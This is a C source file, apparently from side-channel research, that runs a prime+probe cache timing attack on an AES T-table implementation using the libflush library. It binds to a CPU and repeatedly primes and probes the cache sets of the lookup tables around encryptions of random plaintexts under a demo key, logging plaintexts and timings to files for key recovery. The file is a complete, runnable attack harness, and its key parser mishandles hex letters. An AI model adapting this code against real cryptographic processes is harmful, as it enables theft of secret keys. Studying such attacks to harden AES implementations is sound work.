/* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include "AES.h"
#include "gaddr.h"
#include "gset.h"
#include <getopt.h>
#include <inttypes.h>
#include <jni.h>
#include <libflush/libflush.h>
#include <malloc.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#define REPEAT_TIMES 100    // tmp sample sum

#define BIND_TO_CPU 0
#define BIND_THREAD_TO_CPU 1
#define AES_TABLE_LENGTH 16    // the block num of aes look up table
#define AES_SAMPLE_SUM 2000       // sample sum
#define AES_KEY_MAX_VALUE 16         // the possibility of key
#define AES_KEY_LENGTH 16       // the length of key
#define AES_PLAINTEXT_LENGTH 16 // the length of plaintext
#define TMP_NUMS 64
#define AES_KEY "0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66,0x77, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,"

#define MINI(a, b) (((a) > (b)) ? (b) : (a))
#define MAXI(a, b) (((a) > (b)) ? (a) : (b))
#define LENGTH(x) (sizeof(x))

#define _STR(x) #x
#define STR(x) _STR(x)


static void
print_help(char* argv[]) {
  fprintf(stdout, "Usage: %s [OPTIONS]\n", argv[0]);
  fprintf(stdout, "\t-f, -function <value>\t Function (default: mode1)\n");
  fprintf(stdout, "\t-c, -cpu <value>\t Bind to cpu (default: " STR(BIND_TO_CPU) ")\n");
  fprintf(stdout, "\t-s, -sum <value> \t Nums of samples: " STR(AES_SAMPLE_SUM) ")\n");
  fprintf(stdout, "\t-r, -repeat <value> \t Probe nums of each samples: " STR(REPEAT_TIMES) ")\n");
  fprintf(stdout, "\t-k, -key <value> \t AES key: " STR(AES_KEY)")\n");
  fprintf(stdout, "\t-h, -help\t\t Help page\n");
}

void doaes(unsigned char *inaes, unsigned char *key, aesTableSet *tables); // execute aes algorithm with a given plaintext
void getPlaintext(unsigned char *plaintext); // return a random plaintext
void freeresource(uint64_t **tmp);
void getTmpTime1(libflush_session_t *libflush_session, unsigned char *inaes, unsigned char *key, uint64_t **tmp, size_t repeat_times, aesTableSet *tables);
void getTmpTime2(libflush_session_t *libflush_session, unsigned char *inaes, unsigned char *key, uint64_t **tmp, size_t repeat_times, aesTableSet *tables);
void getTmpTime3(libflush_session_t *libflush_session, unsigned char *inaes, unsigned char *key, uint64_t **tmp, size_t repeat_times, aesTableSet *tables);
void writePTF(unsigned char* inaes);
void writeT1TF(uint64_t **tmp, size_t repeat_times);
void writeT2TF(uint64_t **tmp, size_t repeat_times);

typedef void (*evict_mode_t)(libflush_session_t *libflush_session, unsigned char *inaes, unsigned char *key, uint64_t **tmp, size_t repeat_times, aesTableSet *tables);

typedef struct function_mapping_s {
  const char* name;
  evict_mode_t evict_function;
} function_mapping_t;

function_mapping_t function_mapping[] = {
  {"mode1", getTmpTime1},
  {"mode2", getTmpTime2},
  {"mode3", getTmpTime3},
};
                        
int main(int argc, char* argv[]) {

  aesTableSet tables; // the struct contains aes t-table's start addr
  libflush_session_t *libflush_session;

  /* Define parameters */
  size_t cpu = BIND_TO_CPU;
  size_t thread_cpu = BIND_THREAD_TO_CPU;
  size_t repeat_times = REPEAT_TIMES;
  size_t sample_sum = AES_SAMPLE_SUM;
  evict_mode_t evict_function = getTmpTime1;
  char* function_name = "mode1";
  unsigned char key[AES_KEY_LENGTH] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77};

  /* Parse arguments */
  static const char* short_options = "f:c:s:r:k:h";
  static struct option long_options[] = {
    {"function",        required_argument, NULL, 'f'},
    {"cpu",             required_argument, NULL, 'c'},
    {"sum",             required_argument, NULL, 's'},
    {"repeat",          required_argument, NULL, 'r'},
    {"key",             required_argument, NULL, 'k'},
    {"help",            no_argument,       NULL, 'h'},
    { NULL,             0, NULL, 0}
  };

  size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);
  fprintf(stdout, "NUMBER OF CPUS: %zu\n", number_of_cpus);

  int c;
  while ((c = getopt_long(argc, argv, short_options, long_options, NULL)) != -1) {
    switch (c) {
      case 'f':
        {
          bool found = false;
          for (size_t i = 0; i < LENGTH(function_mapping); i++) {
            if (strcmp(optarg, function_mapping[i].name) == 0) {
              evict_function = function_mapping[i].evict_function;
              function_name = optarg;
              found = true;
              break;
            }
          }
          if (found == false) {
            fprintf(stderr, "Error: Invalid function mapping '%s'\n", optarg);
            return -1;
          }
        }
        break;
      case 'c':
        cpu = atoi(optarg);
        if (cpu >= number_of_cpus) {
          fprintf(stderr, "Error: CPU %zu is not available.\n", cpu);
          return -1;
        }
        break;
      case 's':
        sample_sum = atoi(optarg);
        if (sample_sum <= 0) {
          fprintf(stderr, "Error: Sample sum %zu is not available.\n", sample_sum);
          return -1;
        }
        break;
      case 'r':
        repeat_times = atoi(optarg);
        if (repeat_times <= 0) {
          fprintf(stderr, "Error: Repeat times %zu is not available.\n", repeat_times);
          return -1;
        }
        break;
      case 'k':
        {
          int index = 0;
          unsigned int keybyte = 0;
          for (int i = 0; optarg[i] != '\0'; i++) {
            char c = optarg[i];
            if (c == 'x') keybyte = 0;
            else if (c == ',') key[index++] = keybyte;
            else if (c >= '0' && c <= '9') keybyte = keybyte * 16 + (c - '0');
            else {
              fprintf(stderr, "Unexpected char %c in key.\n", c);
              break;
            }
          }
          if (index != 16) {
            fprintf(stderr, "Error: Key %s is not available.\n", optarg);
            return -1;
         }
        }
        break;
      case 'h':
        print_help(argv);
        return 0;
      case ':':
        fprintf(stderr, "Error: option `-%c' requires an argument\n", optopt);
        break;
      case '?':
      default:
        fprintf(stderr, "Error: Invalid option '-%c'\n", optopt);
        return -1;
    }
  }
  fprintf(stdout, "Execute params:\tcpu            %zu\n", cpu);
  fprintf(stdout, "Execute params:\tthread_cpu     %zu\n", thread_cpu);
  fprintf(stdout, "Execute params:\tsample sum     %zu\n", sample_sum);
  fprintf(stdout, "Execute params:\trepeat times   %zu\n", repeat_times);
  fprintf(stdout, "Execute params:\tmode           %s\n", function_name);
  fprintf(stdout, "Execute params:\tkey            [0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x]\n",
  key[0], key[1], key[2], key[3], key[4], key[5], key[6], key[7], key[8], key[9], key[10], key[11], key[12], key[13], key[14], key[15]);

  /* Bind to CPU */
  cpu = cpu % number_of_cpus;
  thread_cpu = thread_cpu % number_of_cpus;

  if (libflush_bind_to_cpu(cpu) == false) {
    fprintf(stderr, "Warning: Could not bind to CPU: %zu\n", cpu);
  } else {
    fprintf(stdout, "attack process bind to cpu %d\n", BIND_TO_CPU);
  }

  /* Initialize libflush */
  libflush_session_args_t args;
  args.bind_to_cpu = thread_cpu;

  if (libflush_init(&libflush_session, &args) == false) {
    fprintf(stderr, "Error: Could not initialize libflush\n");
    return -1;
  }

  fprintf(stdout, "initialize libflush success!\n");

  fprintf(stdout, "now start aes attack\n");

  doaes(key, key, &tables);

  srand((unsigned int)time(0));

  uint64_t *tmp[TMP_NUMS];
  for (int i = 0; i < TMP_NUMS; i++) {
    tmp[i] = (uint64_t *)malloc(repeat_times * sizeof(uint64_t));
    if (tmp[i] == NULL) {
      fprintf(stderr, "ERROR : could not allocate memory to tmp[%d]!!\n", i);
      return -1;
    }
    memset(tmp[i], 0, repeat_times * sizeof(uint64_t));
  }
 unsigned char inaes[AES_KEY_LENGTH] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77};

  for (int i = 0; i < sample_sum; i++) {
    getPlaintext(inaes);
    writePTF(inaes);
    evict_function(libflush_session, inaes, key, tmp, repeat_times, &tables);
  }

  freeresource(tmp);
  aes_ecb_encrypt(NULL, NULL, NULL, &tables);
  fprintf(stdout, "aes attack completed\n");
  return 0;
}

void getTmpTime1(libflush_session_t *libflush_session, unsigned char *inaes, unsigned char *key, uint64_t **tmp, size_t repeat_times, aesTableSet *tables) {
  int base0 = tables->t0_si[0];
  int base1 = tables->t1_si[0];
  int base2 = tables->t2_si[0];
  int base3 = tables->t3_si[0];
  for (int i = 0; i < repeat_times; i++) {
    for (int j = 0; j < AES_TABLE_LENGTH; j++) {
      libflush_prime(libflush_session, base0 + j);
      libflush_prime(libflush_session, base1 + j);
      libflush_prime(libflush_session, base2 + j);
      libflush_prime(libflush_session, base3 + j);
    }
    for (int j = 0; j < AES_TABLE_LENGTH; j++) {
      tmp[j+AES_TABLE_LENGTH*0][i] = libflush_probe(libflush_session, base0 + j);
      tmp[j+AES_TABLE_LENGTH*1][i] = libflush_probe(libflush_session, base1 + j);
      tmp[j+AES_TABLE_LENGTH*2][i] = libflush_probe(libflush_session, base2 + j);
      tmp[j+AES_TABLE_LENGTH*3][i] = libflush_probe(libflush_session, base3 + j);
    }
  }
  writeT1TF(tmp, repeat_times);
  for (int i = 0; i < repeat_times; i++) {
    for (int j = 0; j < AES_TABLE_LENGTH; j++) {
      libflush_prime(libflush_session, base0 + j);
      libflush_prime(libflush_session, base1 + j);
      libflush_prime(libflush_session, base2 + j);
      libflush_prime(libflush_session, base3 + j);
    }
    doaes(inaes, key, tables);
    for (int j = 0; j < AES_TABLE_LENGTH; j++) {
      tmp[j+AES_TABLE_LENGTH*0][i] = libflush_probe(libflush_session, base0 + j);
      tmp[j+AES_TABLE_LENGTH*1][i] = libflush_probe(libflush_session, base1 + j);
      tmp[j+AES_TABLE_LENGTH*2][i] = libflush_probe(libflush_session, base2 + j);
      tmp[j+AES_TABLE_LENGTH*3][i] = libflush_probe(libflush_session, base3 + j);
    }
  }
  writeT2TF(tmp, repeat_times);
}

void getTmpTime2(libflush_session_t *libflush_session, unsigned char *inaes, unsigned char *key, uint64_t **tmp, size_t repeat_times, aesTableSet *tables) {
  int base = tables->t0_si[0];
  for (int i = 0; i < repeat_times; i++) {
    for (int j = 0; j < AES_TABLE_LENGTH * 4; j++) {
      libflush_prime(libflush_session, base + j);
    }
    for (int j = 0; j < AES_TABLE_LENGTH * 4; j++) {
      tmp[j][i] = libflush_probe(libflush_session, base + j);
    }
  }
  writeT1TF(tmp, repeat_times);
  for (int i = 0; i < repeat_times; i++) {
    for (int j = 0; j < AES_TABLE_LENGTH * 4; j++) {
      libflush_prime(libflush_session, base + j);
    }
    doaes(inaes, key, tables);
    for (int j = 0; j < AES_TABLE_LENGTH * 4; j++) {
      tmp[j][i] = libflush_probe(libflush_session, base + j);
    }
  }
  writeT2TF(tmp, repeat_times);
}

void getTmpTime3(libflush_session_t *libflush_session, unsigned char *inaes, unsigned char *key, uint64_t **tmp, size_t repeat_times, aesTableSet *tables) {
  int base = tables->t0_si[0];
  uint64_t time = 0;
  for (int i = 0; i < repeat_times; i++) {
    for (int j = 0; j < AES_TABLE_LENGTH * 4; j++) {
      libflush_prime(libflush_session, base + j);
      time = libflush_probe(libflush_session, base + j);
      tmp[j][i] = time;
    }
  }
  writeT1TF(tmp, repeat_times);
  for (int i = 0; i < repeat_times; i++) {
    for (int j = 0; j < AES_TABLE_LENGTH * 4; j++) {
      libflush_prime(libflush_session, base + j);
      doaes(inaes, key, tables);
      time = libflush_probe(libflush_session, base + j);
      tmp[j][i] = time;
    }
  }
  writeT2TF(tmp, repeat_times);
}

void writePTF(unsigned char* inaes) {
  FILE* file = NULL;
  if ((file = fopen("plaintext", "a")) == NULL) {
    fprintf(stderr, "ERROR : could not open file plaintext!\n");
    return;
  }
  for (int i = 0; i < 16; i++) {
    fprintf(file, "%4zu", inaes[i]);
  }
  fprintf(file, "\n");
  fflush(file);
  fclose(file);
}

void writeT1TF(uint64_t **tmp, size_t repeat_times) {
  FILE* file = NULL;
  if ((file = fopen("ntime", "a")) == NULL) {
    fprintf(stderr, "ERROR : could not open file ntime!\n");
    return;
  }
  for (int i = 0; i < TMP_NUMS; i++) {
    for (int j = 0; j < repeat_times; j++) {
      fprintf(file, "%10zu", tmp[i][j]);
    }
    fprintf(file, "\n");
  }
  fflush(file);
  fclose(file);
  for (int i = 0; i < AES_TABLE_LENGTH * 4; i++) {
    for (int j = 0; j < repeat_times; j++) {
      tmp[i][j] = 0;
    }
  }
}

void writeT2TF(uint64_t **tmp, size_t repeat_times) {
  FILE* file = NULL;
  if ((file = fopen("time", "a")) == NULL) {
    fprintf(stderr, "ERROR : could not open file time!\n");
    return;
  }
  for (int i = 0; i < TMP_NUMS; i++) {
    for (int j = 0; j < repeat_times; j++) {
      fprintf(file, "%10zu", tmp[i][j]);
    }
    fprintf(file, "\n");
  }
  fflush(file);                                                    
  fclose(file);
  for (int i = 0; i < AES_TABLE_LENGTH * 4; i++) {
    for (int j = 0; j < repeat_times; j++) {
      tmp[i][j] = 0;
    }
  }
}

void doaes(unsigned char *inaes, unsigned char *key, aesTableSet *tables) {
  unsigned char outaes[16] = {0};
  aes_ecb_encrypt(key, inaes, outaes, tables);
}

void getPlaintext(unsigned char *plaintext) {
  for (int i = 0; i < AES_PLAINTEXT_LENGTH; i++) {
    plaintext[i] = (rand() % 256);
  }
}

void freeresource(uint64_t **tmp) {
  for (int i = 0; i < TMP_NUMS; i++) {
    if (tmp[i] != NULL)
      free(tmp[i]);
  }
}
